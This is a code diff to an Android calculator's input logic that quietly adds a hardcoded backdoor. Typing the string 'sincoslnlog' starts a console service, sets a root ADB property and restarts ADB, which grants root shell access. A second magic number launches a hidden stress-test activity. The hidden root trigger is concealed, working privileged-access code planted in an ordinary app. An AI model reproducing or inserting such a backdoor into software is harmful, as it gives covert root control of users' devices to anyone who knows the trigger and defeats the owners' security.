@@ -32,6 +32,14 @@ import java.util.Set;
 import org.javia.arity.Symbols;
 import org.javia.arity.SyntaxException;
 
+import android.os.SystemService;
+import android.os.SystemProperties;
+import android.provider.Settings;
+import android.content.Intent;
+import java.util.List;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
 class Logic {
     private CalculatorDisplay mDisplay;
     private Symbols mSymbols = new Symbols();
@@ -65,6 +73,8 @@ class Logic {
     private Listener mListener;
     private Context mContext;
     private Set<Entry<String, String>> mTranslationsSet;
+
+	private String IN_CONSOLE_PWD = "sincoslnlog";
 
     Logic(Context context, History history, CalculatorDisplay display) {
         mContext = context;
@@ -106,6 +116,18 @@ class Logic {
     void insert(String delta) {
         mDisplay.insert(delta);
         setDeleteMode(DELETE_MODE_BACKSPACE);
+		if(SystemProperties.get("ro.config.adb_root","true").equals("true")){
+		  String replace = getText().replace("(", "");
+		  if(replace.equals(IN_CONSOLE_PWD)){
+			SystemService.start("console");
+			SystemProperties.set("sys.rkadb.root","1");
+			Settings.Secure.putInt(mContext.getContentResolver(),Settings.Secure.ADB_ENABLED, 0);
+		    try {
+				Thread.sleep(1000);
+			} catch(Exception e) {}
+			Settings.Secure.putInt(mContext.getContentResolver(),Settings.Secure.ADB_ENABLED, 1);
+		  }
+		}
     }
 
     public void onTextChanged() {
@@ -171,8 +193,19 @@ class Logic {
         if (mDeleteMode == DELETE_MODE_CLEAR) {
             clearWithHistory(false); // clear after an Enter on result
         } else {
+           if(getText().equals("83991906")){
+              Intent intent=new Intent("android.intent.action.STRESSTEST");
+             if(isIntentAvailable(mContext,intent)==true)
+              mContext.startActivity(intent);
+          }
             evaluateAndShowResult(getText(), CalculatorDisplay.Scroll.UP);
         }
+    }
+
+public static boolean isIntentAvailable(Context context, Intent intent) {
+    final PackageManager packageManager = context.getPackageManager();
+              List<ResolveInfo> list = packageManager.queryIntentActivities(intent,PackageManager.GET_ACTIVITIES);
+    return list.size() > 0;
     }
 
     public void evaluateAndShowResult(String text, Scroll scroll) {
